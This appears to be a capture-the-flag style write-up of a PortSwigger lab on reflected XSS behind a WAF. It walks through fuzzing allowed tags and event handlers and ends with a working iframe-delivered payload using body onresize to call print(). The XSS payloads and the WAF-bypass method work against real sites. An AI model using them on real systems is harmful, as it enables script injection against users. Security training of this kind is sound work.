
# Reflected XSS into HTML context with most tags and attributes blocked

This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

Note: Your solution must not require any user interaction. Manually causing print() to be called in your own browser will not solve the lab.

---------------------------------------------

References: 

- https://portswigger.net/web-security/cross-site-scripting/exploiting

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---------------------------------------------

The search term is reflected inside an `h1` HTML element:



<img width="262" height="62" alt="1" src="https://github.com/user-attachments/assets/a6017c97-0594-46ca-a0c6-3ca141075158" />




Testing an `h1` tag shows that the filter blocks it:


<img width="675" height="161" alt="2" src="https://github.com/user-attachments/assets/fbaa0e1f-d561-40b5-b9e7-bf4ab0c70acf" />



The `h2` tag is treated differently and is not blocked in the same way:



<img width="669" height="160" alt="3" src="https://github.com/user-attachments/assets/54bdf2d5-c3b8-4ee4-bee1-58a46b5528ee" />



This payload is accepted and produces the expected HTML:

```
<h3>a</h3>
```



<img width="286" height="130" alt="4" src="https://github.com/user-attachments/assets/555ca992-8f93-4037-b75e-a9351fa912e6" />



Adding an event attribute with this payload results in an “Attribute is not allowed” message:

```
<h3 onerror=alert(1)>a</h3>
```



<img width="367" height="94" alt="5" src="https://github.com/user-attachments/assets/3998f2dc-90d7-4ee5-bcb0-53ce808476f4" />



I tested event-handler names with Intruder, using the PortSwigger XSS cheat sheet as the reference:



<img width="621" height="467" alt="6" src="https://github.com/user-attachments/assets/59a1d059-32ce-4732-992e-e1095da8fba5" />



The tests identified these event handlers as accepted:
- onbeforeinput
- onratechange
- onscrollend
- onresize


<img width="504" height="126" alt="7" src="https://github.com/user-attachments/assets/bc149e43-8818-46d0-b3a3-8e8036965dec" />


I repeated the tag tests using Intruder's Battery Ram attack type:



<img width="618" height="526" alt="8" src="https://github.com/user-attachments/assets/318e89f2-3084-400c-93a3-f472b571ac6c" />



The tests identified these event handlers as accepted:
- custom tags
- body



<img width="507" height="71" alt="9" src="https://github.com/user-attachments/assets/b7120630-a24f-4f34-92e1-460b37015027" />




The cheat sheet provides the following details about these attributes:


<img width="679" height="203" alt="10" src="https://github.com/user-attachments/assets/a4eb413f-ac41-4b43-ad10-5832374eae03" />

<img width="682" height="221" alt="11" src="https://github.com/user-attachments/assets/110b6d34-e6c7-4e34-bf05-e56a92f525a1" />

<img width="664" height="229" alt="12" src="https://github.com/user-attachments/assets/5f16ae05-42d8-4fab-b5b9-60ad691f1c0d" />

<img width="685" height="203" alt="13" src="https://github.com/user-attachments/assets/e8be6bf0-f2b0-46aa-953d-552b9aa4d3f1" />




Three candidate payloads remain. Since the `audio` and `video` tags are unavailable, the `onratechange` handler cannot be used:

```
<xss contenteditable onbeforeinput=alert(1)>test
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
<body onresize="print()">
```


For the `onscrollend` variant, the payload was adjusted because `br` and `span` are blocked. Scrolling to the top or bottom is required for the event to fire:

```
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><h2>a</h2><h3 id=x>test</h3></h3>
```



<img width="720" height="336" alt="14" src="https://github.com/user-attachments/assets/dded070f-00a6-487e-bf86-08cfa22c3cc6" />



The `onbeforeinput` variant requires interaction: click the text and modify it to trigger the event:

```
<xss contenteditable onbeforeinput=alert(1)>test</xss>
```


<img width="718" height="249" alt="15" src="https://github.com/user-attachments/assets/e2d5130d-7655-4fae-b9b5-0829d85431d1" />




The third option is valid, but it depends on the browser tab being resized:

```
<body onresize="print()">
```



<img width="609" height="328" alt="16" src="https://github.com/user-attachments/assets/ee61e18a-5845-447a-8f38-b679e82902d9" />




The final payload is placed inside an iframe as shown below:

```
https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E
```

```
<iframe src="https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload=body.style.width='100%'></iframe>
```
